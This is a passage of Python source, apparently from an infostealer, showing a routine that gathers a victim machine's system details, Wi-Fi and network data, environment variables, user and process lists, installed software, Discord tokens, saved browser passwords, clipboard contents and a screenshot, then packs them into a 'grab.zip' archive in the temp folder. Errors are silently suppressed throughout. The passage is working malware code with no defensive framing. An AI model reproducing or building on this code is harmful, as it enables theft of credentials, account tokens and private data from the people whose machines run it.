                  try: open(os.path.join(gdir, n), "w", encoding="utf-8", errors="ignore").write(t or "")
                  except Exception: pass
              w("sysinfo.txt", f_sysinfo()); w("wifi.txt", f_wifi()); w("net.txt", f_net())
              w("env.txt", f_env()); w("users.txt", f_users()); w("processes.txt", f_ps())
              w("installed.txt", f_installed()); w("discord_tokens.txt", f_discord())
              w("browser_passwords.txt", f_browser())
              try: w("clipboard.txt", f_clip_get())
              except Exception: pass
              try:
                  p = f_screen()
                  if p: shutil.copy2(p, os.path.join(gdir, "screen.png"))
              except Exception: pass
              out = os.path.join(tempfile.gettempdir(), "grab.zip")
              with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
                  for dp, dn, fn in os.walk(gdir):
                      for f in fn:
                          fp = os.path.join(dp, f)
                          z.write(fp, os.path.relpath(fp, gdir))
              return out

